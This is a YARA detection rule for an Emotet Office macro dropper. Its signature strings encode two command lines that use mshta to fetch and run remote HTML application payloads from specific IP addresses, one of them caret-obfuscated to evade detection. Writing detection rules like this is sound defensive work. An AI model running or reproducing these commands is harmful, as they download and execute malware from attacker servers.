
rule TrojanDropper_O97M_Emotet_BKB_MTB{
	meta:
		description = "TrojanDropper:O97M/Emotet.BKB!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 02 00 00 01 00 "
		
	strings :
		$a_01_0 = {63 6d 64 20 2f 63 20 6d 5e 73 68 5e 74 5e 61 20 68 5e 74 74 5e 70 5e 3a 2f 5e 2f 38 37 2e 32 35 31 2e 38 36 2e 31 37 38 2f 70 70 2f 5f 2e 68 74 6d 6c } //01 00  cmd /c m^sh^t^a h^tt^p^:/^/87.251.86.178/pp/_.html
		$a_01_1 = {43 4d 44 2e 45 58 45 20 2f 63 20 6d 73 68 74 61 20 68 74 74 70 3a 2f 2f 39 31 2e 32 34 30 2e 31 31 38 2e 31 37 32 2f 67 67 2f 66 66 2f 66 65 2e 68 74 6d 6c } //00 00  CMD.EXE /c mshta http://91.240.118.172/gg/ff/fe.html
	condition:
		any of ($a_*)
 
}